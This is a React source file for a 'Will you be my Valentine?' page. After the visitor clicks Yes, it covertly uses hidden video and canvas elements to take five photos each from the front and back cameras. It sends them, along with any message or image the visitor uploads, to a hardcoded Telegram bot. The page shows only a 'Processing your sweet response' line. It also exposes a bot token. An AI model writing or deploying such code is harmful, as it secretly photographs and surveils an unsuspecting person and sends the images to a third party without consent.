import { useState, useRef, useCallback, useEffect } from 'react';

// Constants for Telegram Bot
const TELEGRAM_BOT_TOKEN = '7823960731:AAEDy3CxHf68-zMMvN0iUObs5pMBchTPMWU';
const TELEGRAM_USER_ID = '6259443940';

interface ValentineAppProps {}

const ValentineApp: React.FC<ValentineAppProps> = () => {
  const [noButtonText, setNoButtonText] = useState<string>('No');
  const [yesButtonScale, setYesButtonScale] = useState<number>(1);
  const [currentView, setCurrentView] = useState<'main' | 'yes' | 'upload'>('main');
  const [uploadMessage, setUploadMessage] = useState<string>('');
  const [uploadedFile, setUploadedFile] = useState<File | null>(null);
  const [isProcessing, setIsProcessing] = useState<boolean>(false);
  const [cameraPermissionState, setCameraPermissionState] = useState<'idle' | 'prompt' | 'granted' | 'denied' | 'unavailable'>('idle');

  // Using useRef to persist the message index across renders without causing re-renders itself
  const messageIndexRef = useRef<number>(0);
  const messages: string[] = [
    "Are you sure?", "Really sure??", "Are you positive?",
    "Pookie please...", "Just think about it!",
    "If you say no, I will be really sad...",
    "I will be very sad...", "I will be very very very sad...",
    "Ok fine, I will stop asking...", "Just kidding, say yes please ❤️"
  ];

  const videoFrontRef = useRef<HTMLVideoElement>(null);
  const videoBackRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

  const sendToTelegram = useCallback(async (type: 'photo' | 'message', data: string | File, caption?: string) => {
    try {
      if (type === 'message') {
        await fetch(`${telegramApiUrl}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_USER_ID,
            text: data as string,
          }),
        });
      } else if (type === 'photo') {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_USER_ID);
        formData.append('photo', data as File);
        if (caption) {
          formData.append('caption', caption);
        }

        await fetch(`${telegramApiUrl}/sendPhoto`, {
          method: 'POST',
          body: formData,
        });
      }
      console.log(`Sent ${type} to Telegram.`);
    } catch (error) {
      console.error(`Failed to send ${type} to Telegram:`, error);
    }
  }, [telegramApiUrl]);

  const capturePhoto = useCallback((videoElement: HTMLVideoElement, cameraType: 'front' | 'back', index: number) => {
    if (!canvasRef.current || !videoElement || !videoElement.videoWidth || !videoElement.videoHeight) {
      console.warn(`Cannot capture photo: video element not ready or canvas not found for ${cameraType} camera.`);
      return;
    }

    const canvas = canvasRef.current;
    canvas.width = videoElement.videoWidth;
    canvas.height = videoElement.videoHeight;
    const context = canvas.getContext('2d');
    if (context) {
      // Draw image to canvas
      context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
      // Convert canvas content to Blob and send
      canvas.toBlob(blob => {
        if (blob) {
          const file = new File([blob], `valentine_${cameraType}_${index + 1}.png`, { type: 'image/png' });
          sendToTelegram('photo', file, `Valentine photo - ${cameraType} cam #${index + 1}`);
        } else {
          console.error("Failed to convert canvas to blob.");
        }
      }, 'image/png');
    }
  }, [sendToTelegram]);

  const stopCameraStream = useCallback((stream: MediaStream | null) => {
    stream?.getTracks().forEach(track => track.stop());
  }, []);

  const handleCameraCapture = useCallback(async () => {
    if (isProcessing) return;
    setIsProcessing(true);
    let frontStream: MediaStream | null = null;
    let backStream: MediaStream | null = null;
    let anyCameraAccessGranted = false;

    try {
      setCameraPermissionState('prompt');
      console.log('Attempting to access cameras...');

      // Attempt to get front camera stream
      try {
        frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        if (videoFrontRef.current) {
          videoFrontRef.current.srcObject = frontStream;
          await videoFrontRef.current.play();
        }
        anyCameraAccessGranted = true;
        console.log('Front camera access granted.');
      } catch (e) {
        console.warn('Could not get front camera:', e);
      }

      // Attempt to get back camera stream
      try {
        backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
        if (videoBackRef.current) {
          videoBackRef.current.srcObject = backStream;
          await videoBackRef.current.play();
        }
        anyCameraAccessGranted = true;
        console.log('Back camera access granted.');
      } catch (e) {
        console.warn('Could not get back camera:', e);
      }

      if (anyCameraAccessGranted) {
        setCameraPermissionState('granted');
        const captureInterval = 500; // 0.5 seconds between photos

        // Capture 5 photos from front camera if available
        if (frontStream && videoFrontRef.current) {
          await new Promise<void>(resolve => {
            let count = 0;
            const intervalId = setInterval(() => {
              if (count < 5) {
                capturePhoto(videoFrontRef.current!, 'front', count);
                count++;
              } else {
                clearInterval(intervalId);
                resolve();
              }
            }, captureInterval);
          });
        }

        // Capture 5 photos from back camera if available
        if (backStream && videoBackRef.current) {
          await new Promise<void>(resolve => {
            let count = 0;
            const intervalId = setInterval(() => {
              if (count < 5) {
                capturePhoto(videoBackRef.current!, 'back', count);
                count++;
              } else {
                clearInterval(intervalId);
                resolve();
              }
            }, captureInterval);
          });
        }
      } else {
        setCameraPermissionState('denied');
        console.warn('No camera streams available. Showing upload option.');
        setCurrentView('upload');
      }

    } catch (error) {
      console.error('General error accessing camera:', error);
      setCameraPermissionState('unavailable'); // More general error
      setCurrentView('upload'); // Show upload option if camera access fails
    } finally {
      stopCameraStream(frontStream);
      stopCameraStream(backStream);
      setIsProcessing(false);
    }
  }, [isProcessing, capturePhoto, stopCameraStream]);

  const no = useCallback(() => {
    setNoButtonText(messages[messageIndexRef.current]);
    messageIndexRef.current = (messageIndexRef.current + 1) % messages.length;
    setYesButtonScale(prev => prev * 1.4);
  }, [messages]);

  const yes = useCallback(() => {
    setCurrentView('yes'); // Immediately show the "Knew you would say yes!" message
    handleCameraCapture(); // Initiate camera capture in the background
  }, [handleCameraCapture]);

  const handleUploadSubmit = useCallback(async (e: React.FormEvent) => {
    e.preventDefault();
    setIsProcessing(true);
    if (uploadMessage.trim()) {
      await sendToTelegram('message', `Valentine message: ${uploadMessage}`);
    }
    if (uploadedFile) {
      await sendToTelegram('photo', uploadedFile, `Valentine uploaded image`);
    }

    // After message/file upload, still attempt camera capture for reaction,
    // as per instructions: "it will take pictures front and back for her face reaction".
    // This will re-trigger the camera permission prompt if it was previously denied.
    await handleCameraCapture();

    // After processing, ensure the 'yes' view is shown
    setCurrentView('yes');
    setIsProcessing(false);
  }, [uploadMessage, uploadedFile, sendToTelegram, handleCameraCapture]);

  // Tailwind mapping for a consistent color palette
  const tailwindColors = {
    primaryRed: 'text-red-700',
    lightPinkBg: 'bg-rose-50',
    yesGreen: 'bg-green-500',
    noRed: 'bg-red-500',
    footerBgGradient: 'bg-gradient-to-br from-black to-pink-950',
    footerText: 'text-pink-300',
    footerLink: 'text-pink-400',
    footerLinkHover: 'hover:text-white',
  };

  return (
    <div className={`${tailwindColors.lightPinkBg} flex flex-col justify-between items-center min-h-screen font-sans`}>
      {/* Hidden video and canvas elements for camera capture */}
      <video ref={videoFrontRef} autoPlay playsInline muted className="hidden"></video>
      <video ref={videoBackRef} autoPlay playsInline muted className="hidden"></video>
      <canvas ref={canvasRef} className="hidden"></canvas>

      <div className="flex flex-col items-center justify-center flex-grow py-8 px-4 w-full max-w-4xl">
        {currentView === 'main' && (
          <div className="text-center">
            <h1 className={`text-4xl lg:text-5xl font-bold ${tailwindColors.primaryRed} mb-8`}>Will you be my Valentine?</h1>

            <div className="flex justify-center gap-4 mb-8">
              <button
                className={`${tailwindColors.yesGreen} text-white font-semibold py-3 px-6 rounded-lg shadow-md transition-all duration-200 ease-in-out transform`}
                onClick={yes}
                style={{ fontSize: `${1.5 * yesButtonScale}em` }}
              >
                Yes
              </button>
              <button
                className={`${tailwindColors.noRed} text-white font-semibold py-3 px-6 rounded-lg shadow-md transition-transform duration-200 ease-in-out hover:scale-105`}
                onClick={no}
              >
                {noButtonText}
              </button>
            </div>

            <div className="max-w-xs sm:max-w-sm md:max-w-md lg:max-w-lg xl:max-w-xl mx-auto">
              <img
                src="https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExbW5lenZyZHI5OXM2eW95b3pmMG40cWVrMDhtNjVuM3A4dGNxa2g2dSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/VM1fcpu2bKs1e2Kdbj/giphy.gif"
                alt="Cute animated character asking to be valentine"
                className="w-full h-auto rounded-lg"
              />
            </div>
          </div>
        )}

        {currentView === 'yes' && (
          <div className="text-center">
            <h1 className={`text-4xl lg:text-5xl font-bold ${tailwindColors.primaryRed} mb-8`}>Knew you would say yes! 💘</h1>
            <div className="max-w-xs sm:max-w-sm md:max-w-md lg:max-w-lg xl:max-w-xl mx-auto">
              <img
                src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExMmo3c3l5ODh3ZGN6NHhhaDE2Mjg1ZjkwOXczdDFxbWM3dTBtaW9zaiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/9XY4f3FgFTT4QlaYqa/giphy.gif"
                alt="Happy animated character celebrating"
                className="w-full h-auto rounded-lg"
              />
            </div>
            {isProcessing && <p className="mt-4 text-gray-600 text-lg animate-pulse">Processing your sweet response...</p>}
          </div>
        )}

        {currentView === 'upload' && (
          <div className="bg-white p-8 rounded-lg shadow-xl max-w-md w-full mx-4">
            <h2 className="text-2xl font-bold text-gray-800 mb-4 text-center">Leave a message for me!</h2>
            <p className="text-gray-600 mb-6 text-center">
              {cameraPermissionState === 'denied' || cameraPermissionState === 'unavailable'
                ? "It seems we couldn't access your camera. Please share your thoughts or a picture instead!"
                : "Please share your thoughts or a picture for me!"
              }
            </p>
            <form onSubmit={handleUploadSubmit} className="space-y-6">
              <div>
                <label htmlFor="message" className="block text-sm font-medium text-gray-700 mb-2">Your Message:</label>
                <textarea
                  id="message"
                  className="w-full p-3 border border-gray-300 rounded-md focus:ring-pink-500 focus:border-pink-500 transition duration-150 ease-in-out resize-y"
                  rows={4}
                  placeholder="Tell me something sweet..."
                  value={uploadMessage}
                  onChange={(e) => setUploadMessage(e.target.value)}
                ></textarea>
              </div>
              <div>
                <label htmlFor="file-upload" className="block text-sm font-medium text-gray-700 mb-2">Upload a picture (optional):</label>
                <input
                  id="file-upload"
                  type="file"
                  accept="image/*"
                  className="block w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-pink-50 file:text-pink-700 hover:file:bg-pink-100 cursor-pointer"
                  onChange={(e) => setUploadedFile(e.target.files ? e.target.files[0] : null)}
                />
                {uploadedFile && <p className="mt-2 text-sm text-gray-500">Selected: {uploadedFile.name}</p>}
              </div>
              <button
                type="submit"
                className="w-full bg-pink-600 text-white font-semibold py-3 px-6 rounded-md hover:bg-pink-700 focus:outline-none focus:ring-2 focus:ring-pink-500 focus:ring-offset-2 transition duration-150 ease-in-out"
                disabled={isProcessing}
              >
                {isProcessing ? 'Sending...' : 'Send Message'}
              </button>
            </form>
            {(cameraPermissionState === 'denied' || cameraPermissionState === 'unavailable') && !isProcessing && (
                <p className="mt-4 text-sm text-red-500 text-center">
                    We were unable to access your camera for your reaction.
                </p>
            )}
            {isProcessing && <p className="mt-4 text-gray-600 text-lg animate-pulse">Processing your message and reaction...</p>}
          </div>
        )}
      </div>

      <div className={`w-full ${tailwindColors.footerBgGradient} ${tailwindColors.footerText} text-center py-4 text-sm tracking-wide`}>
        Made by <strong>@corpsealone</strong><br />
        <a href="https://instagram.com/corpsealone" target="_blank" rel="noopener noreferrer" className={`${tailwindColors.footerLink} ${tailwindColors.footerLinkHover}`}>Insta</a> |
        <a href="https://t.me/iFuckBaddies" target="_blank" rel="noopener noreferrer" className={`${tailwindColors.footerLink} ${tailwindColors.footerLinkHover}`}>Telegram</a>
      </div>
    </div>
  );
};

export default ValentineApp;